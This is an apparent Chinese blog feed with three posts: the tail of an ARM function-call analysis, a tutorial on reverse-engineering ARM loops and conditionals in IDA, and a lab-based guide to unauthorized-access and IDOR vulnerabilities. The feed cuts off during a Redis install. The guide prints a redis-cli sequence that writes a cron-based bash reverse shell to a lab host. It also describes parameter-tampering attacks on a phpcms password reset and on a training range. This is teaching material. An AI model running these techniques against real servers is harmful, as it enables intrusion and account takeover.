alt="1562659844246"></p><p>通过fun1就可以看到函数的具体操作行为，其中最后返回值BX，带状态切换返回，其中的LR则为fun2的函数MOV的地址值，返回到fun2中继续执行。</p><p><img src="\2019\07\逆向函数分析引用\1562659872641.png" alt="1562659872641"></p><p>而fun2中的最后代码也对应了开头的两个汇编语句，恢复sp指令值，将栈内容恢复到寄存器中。获取到参数值后，回到MOV指令中其中注释的fun1和fun2代表当前分支的输入参数。最后都执行到loc_4B8，结果保存到R0中返回，最后也是恢复sp和寄存器。</p><p><img src="\2019\07\逆向函数分析引用\1562662004752.png" alt="1562662004752"></p><p>这时候再看main函数最后执行，获取的fun3返回赋值给R2，至于LDR和ADD，代表了读取unk_5C8标记处的参数字段，点击则可以看到是“%d”，也就是R3代表“%d”,R1代表参数返回值。由printf来输出。最后返回0。结束函数执行。</p><p><img src="\2019\07\逆向函数分析引用\1562662154590.png" alt="1562662154590"></p><p>此汇编分析主要是函数调用和返回之间的联系，希望也可以为后面的读取APP so文件打下基础把。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代码编译，使用代码如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int fun1()
{
    int a;
    int b;
    b=10;
    a=b++;
  
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ARM原生循环语句逆向分析</title>
    <link href="/2019/07/ARM%E5%8E%9F%E7%94%9F%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>/2019/07/ARM原生循环语句逆向分析/</id>
    <published>2019-07-03T07:09:57.000Z</published>
    <updated>2019-07-26T09:56:09.610Z</updated>
    
    <content type="html"><![CDATA[<h4 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h4><p>使用的代码为非虫的Android软件安全权威指南，app6.c</p><p>代码如下：</p><pre><code>#include &lt;stdio.h&gt;int nums[5] = {1, 2, 3, 4, 5};int for1(int n) {    int i = 0;    int s = 0;    for (i = 0; i &lt; n; i++) {        s += i * 2;    }    return s;}int for2(int n) {    int i = 0;    int s = 0;    for (i = 0; i &lt; n; i++) {        s += i * i + nums[n - 1];    }    return s;}int dowhile(int n) {    int i = 1;    int s = 0;    do {        s += i;    } while (i++ &lt; n);    return s;}int whiledo(int n) {    int i = 1;    int s = 0;    while (i &lt;= n) {        s += i++;    }    return s;}void if1(int n) {    if (n &lt; 10) {        printf(&quot;the number less than 10\n&quot;);    } else {        printf(&quot;the number greater than or equal to 10\n&quot;);    }}void if2(int n) {    if (n &lt; 16) {        printf(&quot;he is a boy\n&quot;);    } else if (n &lt; 30) {        printf(&quot;he is a young man\n&quot;);    } else if (n &lt; 45) {        printf(&quot;he is a strong man\n&quot;);    } else {        printf(&quot;he is an old man\n&quot;);    }}int main(int argc, char *argv[]) {    printf(&quot;for1:%d\n&quot;, for1(5));    printf(&quot;for2:%d\n&quot;, for2(5));    printf(&quot;dowhile:%d\n&quot;, dowhile(100));    printf(&quot;while:%d\n&quot;, whiledo(100));    if1(5);    if2(35);    return 0;}</code></pre><p>删除了其中的switch函数，编译的时候函数一直报错，使用make编译，创建jni目录，把c文件和Makefile放入到目录中，修改文件为如下：</p><pre><code>#设置目录NDK_ROOT=D:\Androidstudio-sdk\android-ndk-r14bTOOLCHAINS_ROOT=$(NDK_ROOT)\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\bin\arm-linux-androideabiTOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\lib\gcc\arm-linux-androideabi\4.9.x\include-fixedPLATFORM_ROOT=$(NDK_ROOT)\platforms\android-14\arch-armPLATFORM_INCLUDE=$(PLATFORM_ROOT)\usr\includePLATFORM_LIB=$(PLATFORM_ROOT)\usr\libMODULE_NAME=app6BUILD_TYPE=cPATH_ANDROID=/data/local/tmp/RM=delFLAGS=-I$(TOOLCHAINS_INCLUDE) \    -I$(PLATFORM_INCLUDE) \    -L$(PLATFORM_LIB) \    -nostdlib \    -lgcc \    -Bdynamic \    -lc    \    -O0OBJS=$(MODULE_NAME).o \    $(PLATFORM_LIB)\crtbegin_dynamic.o \    $(PLATFORM_LIB)\crtend_android.oall:    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE    $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIEclean:    $(RM) *.oinstall:    adb push $(MODULE_NAME) $(PATH_ANDROID)    adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME)    adb shell $(PATH_ANDROID)$(MODULE_NAME)</code></pre><p>编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击for1函数，空格切换图形视图。一般看到这种形式的箭头指向的时候基本就是for或者while语句。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561960721772.png" alt="1561960721772"></p><h4 id="1-for1函数"><a href="#1-for1函数" class="headerlink" title="1. for1函数"></a>1. for1函数</h4><p>查看第一个汇编指令块，创建了三个函数，开头先做了保存子程序现场，开启堆栈空间。R0-R3，是用作传入变量寄存器，所以此处有三个变量，分别为，var_10, var_8, var_c。最后强制跳转到loc_3e8标记处。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561962684226.png" alt="1561962684226"></p><p>loc_3e8处的汇编代码块，从存储器中加载两个变量值到R2，R3然后对比两个变量，如果R2小于R3，则跳转到loc_3c8标记处。其中对var_8做了一次逻辑左移处理，相当于R3 = R3 * 2^1。再获取变量var_c，执行操作R3 = R3 +R2，再存储到存储器中。下面就相当于for循环中的循环变量自加。最后循环跳出后，再把var_c的值返回。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561964069808.png" alt="1561964069808"></p><p>按照以上逻辑写一段C代码，如下：</p><pre><code>int for1(int var_10){    int var_8 = 0;    int var_c = 0;    for(var_8 = 0; var_8 &lt; var_10; var_8++){        var_c = var_c + var_8 &lt;&lt; 1;    }    return var_c;}</code></pre><h4 id="2-for2函数"><a href="#2-for2函数" class="headerlink" title="2. for2函数"></a>2. for2函数</h4><p>for2跟如上的for1基本类似，就是内部处理处有点不一样，其中nums，点击一下就可以看到是五位的数组，具体是，先var_8自乘，然后读取nums数组，R3为nums数组的地址值，也就是nums[var_10 -1]，再加var_8的自乘和var_c。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562135688840.png" alt="1562135688840"></p><p>C代码：</p><pre><code>int nums[5] = {1,2,3,4,5};int for2(int var_10){    int var_8 = 0;    int var_c = 0;    for(var_8 = 0; var_8 &lt; var_10; var_8++){        var_c =var_c + var_8* var_8  + nums[var_10 - 1];    }    return var_c;}</code></pre><h4 id="3-dowhile函数"><a href="#3-dowhile函数" class="headerlink" title="3. dowhile函数"></a>3. dowhile函数</h4><p>其中大部分都类似以上汇编代码，其中dowhile和whiledo存在有明显不同，dowhile是先执行内部的汇编代码，变量执行自加等操作，最后在判断是否一致，循环体上大致类似如下图，而whiledo更类似于如上的for循环体。汇编中并没有强制跳转，而且跳转标记在判断跳转处的上方。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1561972796048.png" alt="1561972796048"></p><p>根据汇编代码写出大致的C代码。</p><pre><code>int dowhile(int var_10){    int var_8 = 1;    int var_c = 0;    do{        var_c = var_8 + var_c;        var_8 = var_8 + 1;    }while(var_8 &lt; var_10)    return var_c}</code></pre><h4 id="4-whiledo函数"><a href="#4-whiledo函数" class="headerlink" title="4. whiledo函数"></a>4. whiledo函数</h4><p>whiledo从结构体上和for1相同，本来这两种循环就及其类似，主要查看的时候能分清while循环的特点和逻辑来区分，哪个参数为判断参数，哪个参数为计算参数。在B指令执行的地方，就为for和while的判断指令。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562122434389.png" alt="1562122434389"></p><p>根据汇编代码写出大致的C代码。</p><pre><code>int whiledo(int var_10){    int var_8 = 1;    int var_c = 0;    while(var_8 &lt;= var_10){        var_8 = var_8 + 1;        var_c = var_c + var_8;    }    return var_c}</code></pre><h4 id="5-if1-函数"><a href="#5-if1-函数" class="headerlink" title="5. if1 函数"></a>5. if1 函数</h4><p>如下，具有单分支的if结构体可以看出是if-else判断形式</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562123715096.png" alt="1562123715096"></p><p>按照汇编意思，C代码如下：</p><pre><code>void if1(int var_8){    if(var_8 &gt; 9){        puts(&quot;the number greater than or equal to 10&quot;);    }else{        puts(&quot;the number less than 10&quot;);    }}</code></pre><p>在if判断中，判断体在汇编中和原代码是相反的，意思是var_8 &gt; 9原文应该是var_8 &lt;=9 。printf也由puts来改变输出，puts输出会自动添加换行符，也就不在需要原文中的\n。</p><pre><code>void if1(int var_8){    if(var_8 &lt;= 9){        puts(&quot;the number less than 10&quot;);    }else{        puts(&quot;the number greater than or equal to 10&quot;);    }}</code></pre><h4 id="6-if2函数"><a href="#6-if2函数" class="headerlink" title="6. if2函数"></a>6. if2函数</h4><p>多判断结构体，也就是if-else-if</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562125307657.png" alt="1562125307657"></p><p>其中可以看到有多个LDR计算赋值指令，此处的LDR和MOV类似，只是有些时候MOV不适合使用，所以用LDR来赋值计算。</p><pre><code>LDR     R3, =(aHeIsABoy - 0x5D0)</code></pre><p>代表意思就是，aHeIsABoy的地址值减去0x5D0，赋值给R3。仔细看一下就可以明白，其中的参数都是原字符串。LDR就是aHeIsABoy减去0x5D0，此处是07EC减去0x5D0，为021C。而PC，程序计数器，指的是BL的地址值。详细参考：<a href="https://www.cnblogs.com/ichunqiu/p/9056630.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9056630.html</a></p><p>也就是说，执行到ADD的时候，MOV在译码阶段，BL在取址阶段。PC寄存器总是指向随后的第三条指令。</p><p>用BL的地址值加上R3，05D0加上021C为7EC，也就是aHeIsABoy的地址值，当然IDA已经识别出来并注释到其后。再把字符串由puts输出。</p><pre><code>LDR     R3, =(aHeIsABoy - 0x5D0)     //000007EC aHeIsABoy       DCB &quot;he is a boy&quot;,0ADD     R3, PC, R3      ; &quot;he is a boy&quot;MOV     R0, R3          ; sBL      putsB       loc_628</code></pre><p>按照汇编意思，C代码如下：</p><pre><code>void if2(int var_8){    if(var_8 &gt; 15){        if(var_8 &gt; 29){            if(var_8 &gt; 44){                puts(&quot;he is an old man&quot;);            }            else{                puts(&quot;he is a strong man&quot;);            }        }        else{            puts(&quot;he is a young man&quot;);        }    }    else{        puts(&quot;he is a boy&quot;);    }}</code></pre><p>由于汇编对判断的形式，用else if的形式可以这么写</p><pre><code>void if2(int var_8){    if(var_8 &lt;= 15){        puts(&quot;he is a boy&quot;);    }    else if(var_8 &lt;= 29){        puts(&quot;he is a young man&quot;);    }    else if(var_8 &lt;= 44){        puts(&quot;he is a strong man&quot;);    }    else{        puts(&quot;he is an old man&quot;);    }}</code></pre><p>看完以上的汇编分析后，可以得到循环体的特点，循环体一般为以下：</p><pre><code>....    //汇编代码B loc_xxx....CMP r1, r2BXX loc_xxx....BX LR</code></pre><p>判断形式一般为以下：</p><pre><code>    ....    CMP R1, R2    BXX loc_xxx    ....loc_xxx    ....    B   loc_zzzloc_zzz    ....</code></pre><p>当然，以上CMP后并不一定会跟随B指令，也会由其他条件执行指令，例如：</p><pre><code>CMP R2, R3ADDEQ R2, R3, #1</code></pre><p>其中寄存器存值，仍然是需要注意点，不小心会看错赋值，如下：</p><pre><code>LDR     R3, [R11,#var_8]LDR     R2, [R11,#var_C] ADD     R3, R2, R3      </code></pre><p>在执行一些类似ADD的指令操作后，其中的R3已不在代表var_8，其中的结果跟ADD后所获取到的R3赋值有关，这种情况可以看成：</p><pre><code>a = 1;b = 2;a = a + b;  //3</code></pre><p>所以，其中a的值已不在是1，同样如上中，R3也为此，在初期可能在不能连续查看汇编代码的情况下，会犯这种失误。</p><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>main函数中的赋值和返回值寄存器对应之前函数中的返回和赋值，如MOV R0, #5。在for1中，R0赋值给var_10。</p><p>同时返回值在R0中。</p><p><img src="\2019\07\ARM原生循环语句逆向分析\1562137477746.png" alt="1562137477746"></p><p>下部汇编类似，就不在一步步看啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;代码编译&quot;&gt;&lt;a href=&quot;#代码编译&quot; class=&quot;headerlink&quot; title=&quot;代码编译&quot;&gt;&lt;/a&gt;代码编译&lt;/h4&gt;&lt;p&gt;使用的代码为非虫的Android软件安全权威指南，app6.c&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#i
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>越权/未授权访问</title>
    <link href="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>/2019/06/越权-未授权访问/</id>
    <published>2019-06-18T03:27:13.000Z</published>
    <updated>2019-06-18T07:00:48.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h2><p>未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p><p>何为越权漏洞，通俗的理解为用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。越权一般可以分为：垂直越权，水平越权。而在非用户登陆模式下，任意用户访问特定地址或链接均可以访问到需要用户身份后才可以访问到的功能。越权也可以看为安全配置不当导致的未授权访问。</p><h2 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h2><p>未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。</p><h2 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h2><p>未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。而越权可以分为水平越权和垂直越权。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。</p><h2 id="0x04、漏洞测试方法"><a href="#0x04、漏洞测试方法" class="headerlink" title="0x04、漏洞测试方法"></a>0x04、漏洞测试方法</h2><h3 id="0x04-1、常见的未授权服务"><a href="#0x04-1、常见的未授权服务" class="headerlink" title="0x04-1、常见的未授权服务"></a>0x04-1、常见的未授权服务</h3><h4 id="0x04-1-1、redis未授权访问"><a href="#0x04-1-1、redis未授权访问" class="headerlink" title="0x04-1-1、redis未授权访问"></a>0x04-1-1、redis未授权访问</h4><p>此问题在互联网上曾经多数存在，redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件来反弹shell。</p><pre><code>root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK</code></pre><h4 id="0x04-1-2、Jenkins未授权访问"><a href="#0x04-1-2、Jenkins未授权访问" class="headerlink" title="0x04-1-2、Jenkins未授权访问"></a>0x04-1-2、Jenkins未授权访问</h4><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p><pre><code>http://www.secpulse.com:8080/managehttp://www.secpulse.com:8080/script</code></pre><p>选择脚本命令行可以执行一些系统命令。</p><h4 id="0x04-1-3、MongoDB未授权访问"><a href="#0x04-1-3、MongoDB未授权访问" class="headerlink" title="0x04-1-3、MongoDB未授权访问"></a>0x04-1-3、MongoDB未授权访问</h4><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p><p>默认开启在27017端口，新版早就默认绑定在本地，之前的老版本仍有一些在互联网上开放在跑的端口。</p><h4 id="0x04-1-4、Memcache未授权访问"><a href="#0x04-1-4、Memcache未授权访问" class="headerlink" title="0x04-1-4、Memcache未授权访问"></a>0x04-1-4、Memcache未授权访问</h4><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p><p>默认开启在11211端口，可以使用端口连接工具或者命令，nc等，连接成功则存在。</p><p>关于未授权访问的可以查看：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a></p><h3 id="0x04-2、基于用户ID的越权"><a href="#0x04-2、基于用户ID的越权" class="headerlink" title="0x04-2、基于用户ID的越权"></a>0x04-2、基于用户ID的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/userinfo.php?user_id=user1https://www.xxx.com/user1/userinfo.php?user_id=10001</code></pre><p>我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。</p><p>如果参数为一个固定的数字串时，遍历数字串即可，这种情况下是系统对每个注册用户进行了一个用户id的排序，在众多的开源CMS上都有使用，当然这个字符串也有可能是随机，如果是随机的，量不大的情况下可以采用遍历的形式获取，量较大可以利用burp的随机数爆破，或者同样自己注册账户来测试。</p><h3 id="0x04-3、基于功能对象ID的越权"><a href="#0x04-3、基于功能对象ID的越权" class="headerlink" title="0x04-3、基于功能对象ID的越权"></a>0x04-3、基于功能对象ID的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/userticket.php?user_order=100001https://www.xxx.com/user1/userticket.php?user_order=49ba59ab</code></pre><p>此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。</p><h3 id="0x04-4、基于上传文件对象ID的越权"><a href="#0x04-4、基于上传文件对象ID的越权" class="headerlink" title="0x04-4、基于上传文件对象ID的越权"></a>0x04-4、基于上传文件对象ID的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/userfile.php?fileid=10001https://www.ccc.com/user1/userfile.php?fileid=user1_name.jpg</code></pre><p>这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是<a href="http://www.ccc.com获取信息的方式，还可能会有什么问题呢？" target="_blank" rel="noopener">www.ccc.com获取信息的方式，还可能会有什么问题呢？</a></p><h3 id="0x04-5、基于未授权访问的越权"><a href="#0x04-5、基于未授权访问的越权" class="headerlink" title="0x04-5、基于未授权访问的越权"></a>0x04-5、基于未授权访问的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user1/user.php?user=user1@user.com</code></pre><p>在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。</p><h3 id="0x04-6、基于功能地址的越权"><a href="#0x04-6、基于功能地址的越权" class="headerlink" title="0x04-6、基于功能地址的越权"></a>0x04-6、基于功能地址的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user/getuserinfo.php</code></pre><p>如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址：</p><pre><code>/getuserorder.php/adduser.php/deluser.php/getalluser.php/todetailpage.php/ordercreate.php......</code></pre><p>因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。</p><h3 id="0x04-7、基于接口身份的越权"><a href="#0x04-7、基于接口身份的越权" class="headerlink" title="0x04-7、基于接口身份的越权"></a>0x04-7、基于接口身份的越权</h3><p>举个例子：</p><pre><code>https://www.xxx.com/user/userinfo.phppost: {&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;}</code></pre><p>例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。</p><h2 id="0x05、漏洞靶场"><a href="#0x05、漏洞靶场" class="headerlink" title="0x05、漏洞靶场"></a>0x05、漏洞靶场</h2><p>漏洞环境：phpstudy，webug4.0</p><p>靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。</p><p>漏洞演示：演示为靶场的22号漏洞，越权修改密码</p><p>靶场安装：<a href="https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。" target="_blank" rel="noopener">https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。</a></p><p>把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。</p><p><img src="\2019\06\越权-未授权访问\1560762175585.png" alt="1560762175585"></p><p>另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径：</p><pre><code>header(&quot;Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;)修改为：header(&quot;Location:/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;)</code></pre><p>点击第一个越权修改密码后进入如下页面：</p><p><img src="\2019\06\越权-未授权访问\1560762425340.png" alt="1560762425340"></p><p>此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下：</p><p><img src="\2019\06\越权-未授权访问\1560762734951.png" alt="1560762734951"></p><p>此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面</p><p><img src="\2019\06\越权-未授权访问\1560762941147.png" alt="1560762941147"></p><p>此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。</p><p><img src="\2019\06\越权-未授权访问\1560763134387.png" alt="1560763134387"></p><p>其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。</p><p><img src="\2019\06\越权-未授权访问\1560763314987.png" alt="1560763314987"></p><p>查看数据库修改是否成功：</p><p><img src="\2019\06\越权-未授权访问\1560763331000.png" alt="1560763331000"></p><p>此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。</p><h2 id="0x06、测试工具"><a href="#0x06、测试工具" class="headerlink" title="0x06、测试工具"></a>0x06、测试工具</h2><p>对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。</p><p>此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。</p><p>在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下：</p><p><img src="\2019\06\越权-未授权访问\1560763815165.png" alt="1560763815165"></p><p>此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。</p><p><img src="\2019\06\越权-未授权访问\1560763954202.png" alt="1560763954202"></p><p>获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。</p><p><img src="\2019\06\越权-未授权访问\1560764399936.png" alt="1560764399936"></p><p>其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。</p><p>能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。</p><p>介绍地址：<a href="https://github.com/portswigger/auth-matrix" target="_blank" rel="noopener">https://github.com/portswigger/auth-matrix</a></p><h2 id="0x07、CMS演示"><a href="#0x07、CMS演示" class="headerlink" title="0x07、CMS演示"></a>0x07、CMS演示</h2><h3 id="0x07-1、前台任意修改其他用户信息"><a href="#0x07-1、前台任意修改其他用户信息" class="headerlink" title="0x07-1、前台任意修改其他用户信息"></a>0x07-1、前台任意修改其他用户信息</h3><p>漏洞环境：phpstudy，phpcms9.5.9</p><p>漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码</p><p>漏洞下载：<a href="http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip" target="_blank" rel="noopener">http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip</a></p><p>解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256" target="_blank" rel="noopener">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256</a></p><p><img src="\2019\06\越权-未授权访问\1560820634816.png" alt="1560820634816"></p><p>在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。</p><p><img src="\2019\06\越权-未授权访问\1560820798272.png" alt="1560820798272"></p><p>在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码</p><p><img src="\2019\06\越权-未授权访问\1560824925363.png" alt="1560824925363"></p><p>点击获取邮箱效验码</p><p><img src="\2019\06\越权-未授权访问\1560824994228.png" alt="1560824994228"></p><p>返回上一步输入想修改的用户，如下test2</p><p><img src="\2019\06\越权-未授权访问\1560825360733.png" alt="1560825360733"></p><p>输入之前的邮箱验证码提交</p><p><img src="\2019\06\越权-未授权访问\1560825402669.png" alt="1560825402669"></p><p>点击后显示密码修改成功为以下：</p><p><img src="\2019\06\越权-未授权访问\1560825420971.png" alt="1560825420971"></p><p>尝试使用新密码登陆成功：</p><p><img src="\2019\06\越权-未授权访问\1560825511643.png" alt="1560825511643"></p><p>漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。</p><h3 id="0x07-2、redis未授权访问"><a href="#0x07-2、redis未授权访问" class="headerlink" title="0x07-2、redis未授权访问"></a>0x07-2、redis未授权访问</h3><p>漏洞环境：Ubuntu，reids 3.2.0</p><p>漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell</p><p>安装如下：</p><pre><code>wget http://download.redis.io/releases/redis-3.2.0.tar.gztar xzf redis-3.2.0.tar.gzcd 